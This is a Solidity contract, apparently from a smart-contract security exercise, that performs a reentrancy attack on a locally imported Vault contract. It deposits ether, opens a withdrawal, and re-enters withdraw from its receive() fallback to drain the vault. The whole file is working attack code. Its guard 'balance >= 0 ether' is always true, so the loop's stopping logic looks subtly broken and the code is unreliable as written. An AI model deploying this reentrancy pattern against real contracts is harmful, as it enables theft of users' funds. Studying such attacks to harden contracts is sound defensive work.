// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";

contract ReentrancyAttack {
    Vault public vault;

    constructor(address payable _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    receive() external payable {
        if (address(vault).balance >= 0 ether) {
            vault.withdraw();
        }
    }

    function attack() external payable {
        vault.deposite{value: msg.value}();
        vault.openWithdraw();
        vault.withdraw();
    }

}
